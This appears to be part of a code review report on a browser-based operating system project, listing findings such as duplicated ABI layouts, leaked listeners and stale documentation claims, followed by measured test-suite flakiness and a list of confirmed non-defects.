| # | Address | Claim |
| --- | --- | --- |
| R71 | `src/kernel/calls.mjs:1411` + `src/libos/syscall.mjs:749` | The `statfs` record's 40-byte layout and its six offsets are written out on **both** sides of the boundary with raw literals. Every other record that crosses it — filestat, termios, winsize, pollfd — is declared once in `src/abi.mjs` with a codec and a round-trip assertion in `selfTest()`. |
| R72 | `src/kernel/calls.mjs:1024` + `src/libos/syscall.mjs:534` | The dirent field offsets are raw literals on both sides and the padding arithmetic is duplicated; `src/abi.mjs` states the layout only in prose. |
| R73 | `src/wm/window.mjs:323` | `destroy()` does not end a live drag, so three document listeners outlive the window and keep writing geometry to a detached element for the page's lifetime. The geometry fixture dispatches `pointerup` before `destroy()`, which is why no check sees it. |
| R74 | `src/wm/terminal.mjs:177`, `:184` | `render()` and `screen()` are the same expression twice, so the check reads a recomputed string rather than what was painted. |
| R75 | `src/wm/window.mjs:186`, `:220` | An arrow-key move during a pointer drag is discarded, because the drag replays from a `from` captured at pointerdown. The file claims every gesture has a keyboard spelling "so a check can drive it"; the two are not composable. |
| R76 | `src/wm/window.mjs:56` | The clamp comment describes a right-edge rule the code does not implement (it clamps the left edge). The code is the intended behaviour; the comment is what a reader uses to judge a clamp change. |
| R77 | `www/*.html` ×9 | The `crossOriginIsolated` abort gate, and `out`/`say`, are copy-pasted into nine pages; a `<style>` block is byte-identical in four. |
| R78 | `www/*.html` | `.ok` has drifted to three greens and `.bad` to two reds across the pages — one pass/fail token pair, five values. |
| R79 | `src/fs/vfs.mjs:167` + `src/bin/ls.mjs:17` | `modeString` is implemented twice with different type detection and different bit literals. The vfs copy fills a stat field no consumer reads. |
| R80 | `src/fs/vfs.mjs:118` + `src/bin/ls.mjs:29` | `joinPath` twice. Structural, because a program may import only `/src/abi.mjs` — which is the argument for moving the lexical path helpers there. |
| R81 | `bench/fs-core/probe.py:62` + `bench/syscall-contention/probe.py:62` | `class Serving` and `chrome_full_version` are byte-identical in two probes that already import from `scripts/serve.py`. |
| R82 | `mockups/shoot.py:44`, `bench/feasibility/run.py:22`, `bench/m2-attack/preflight.py:17`, `bench/coep-tiles/probe.py:18` | The CDP connect sequence is hand-rolled in four files while `scripts/cdp.py` is the project's CDP driver with `Browser`/`Session`. Three also carry a dead `sys.path.insert`. |
| R83 | `src/README.md:1` | "src/kernel, src/libos and src/wm are empty until M0." They hold 25 modules. The file is in `check_links.py`'s authored set. |
| R84 | `README.md:6` | "No kernel yet. This is the research, the plan, and a verified environment to build it in." |
| R85 | `README.md:27`, `PLAN.md:12` | "51 numbered constraints" against 209 in `docs/CONSTRAINTS.md` (and `CLAUDE.md` says 209 correctly). |
| R86 | `README.md:30`, `PLAN.md:9` | "507 cited claims across 15 files"; `docs/research/` holds 16 `.md` files. The claim count is not reproducible from the tree and names no query, which `authoring-style.md` §Citations requires. |
| R87 | `CLAUDE.md:319` | Calls `scripts/check.py` a forward reference to a file a milestone has not created, 240 lines after documenting three ways to run it. |
| R88 | `scripts/serve.py:15`, `README.md:10` | The docstring says it serves `./www`; the default is the repo root. `README.md` sends the reader to `/`, which has no `index.html` and returns a directory listing — `serve.py:327` itself prints the right address. |
| R89 | `src/abi.mjs:683`, `src/kernel/synth.mjs:341`, `src/libos/std.mjs:290`, `src/bin/sh.mjs:1027`, `src/libos/syscall.mjs:972`, `src/bin/sh.mjs:998` | Dead: `errOf`, `tableDir`, `EXIT_OK`/`EXIT_FAIL`, four `_`-prefixed `sh` exports added "for the host probe" that no probe imports, `isKernelDown`, and `sh.dispositions` (assigned once, never read). Each grep is in the critic's report. |
| R90 | `src/kernel/devfs.mjs:20`, `src/wm/window.mjs:24`, `:25` | Exported with no importer: `TRACE_RENDER_LIMIT` (now imported, see C7), `DEFAULT_W`, `DEFAULT_H`. |

---

## What this review's own verification measured

Recorded because two of these numbers are not in `MILESTONES.md` and the next session will
otherwise rediscover them.

**The browser suite cannot be run in one process on this machine.** A single `scripts/check.py`
with no `--only` died at `m2` with `connection closed mid-frame` and then
`socket is already closed`, taking the seven checks after it with it: 3 passed, 7 BROKEN, exit 3,
`nothing in this run is evidence of anything`. The harness failed closed, which is the right
outcome. Run one check per Chrome with the ~12 s spacing after `pkill` that
`docs/handoff/CONTINUE-HERE.md` records, and all ten pass.

**`m2` has a timing flake, and it predates this work.** It needs about 105 s and the harness can
read the page before the `drop` section has finished, which surfaces as a single clause failing
with `notes=None` — the field absent rather than wrong. Measured, one Chrome per run:

| tree | runs | pass | fail | durations |
| --- | --- | --- | --- | --- |
| this branch, fixes included | 3 | 3 | 0 | 105.5 s, 104.3 s, 107.0 s |
| `worktree-webos-impl`, before any fix | 3 | 2 | 1 | 104.9 s, 103.8 s, **301.0 s exit 3** |

So it is not a regression from these changes: the unfixed tree flakes the same way, and the fixed
tree passed 3 of 3 here plus a standalone run at 100.7 s. The failing runs are the *short* ones —
86 s against a ~105 s need — which is the same shape as the correction recorded in
`bound the program fetch, and root-cause m4b's intermittent BROKEN` ("it passes in 105.55 s, it was
polled too early"). **It fails closed**, never as a pass. Worth a bounded wait on the `drop`
section's own completion rather than a deadline on the whole page.

## Not defects

Recorded so the next reader does not re-litigate them.

- **`bench/m6-realm/csp-classic.js` is `.js` and not `.mjs`** — it is loaded by `importScripts`,
  which requires a classic script. `CLAUDE.md:197` states the `.mjs` rule without the exception;
  the exception is correct.
- **`CLAUDE.md:26` says 68 calls, `src/abi.mjs:160` says `NSYS: 48`** — `docs/ABI.md` does say 68,
  so `CLAUDE.md` faithfully describes the ABI rather than the implemented surface, and `abi.mjs`
  documents the gap as milestone-ordered growth. A reader taking 68 as implemented is wrong by
  twenty, which is worth a word in `abi.mjs` and is not a divergent copy.
- **`MountTable.resolve`** — a critic tried to break it and could not: `/usr/`, `/usrlocal`,
  `/usr/..`, `/../usr`, `//usr//bin`, `/usr/./bin`, `/USR` and `""` all resolve as the
  component-boundary comment claims.
- **`ByteRing`** — wrap arithmetic walked against full, empty and straddling buffers; nothing
  wrong found.
- **The `/usr` mount is atomic** — `mountProvider` builds the whole tree before the single
  `mounts.add`.
- **`/dev/trace` has one renderer**; `trace.mjs` reads no clock; `procfs.mjs` caches nothing
  outside its bench-gated control.
- **No kernel reach from `src/libos/` or `src/bin/`** — no file in either imports from
  `src/kernel/` or `src/fs/`, and the lockdown runs before any program text is evaluated, walks
  the prototype chain, verifies with `name in obj` rather than `delete`'s return, and faults the
  process on a throw.
- **No dependency, build step or framework** exists; the one sanctioned Python dependency is
  `websocket-client`, and every use of it is driving CDP.
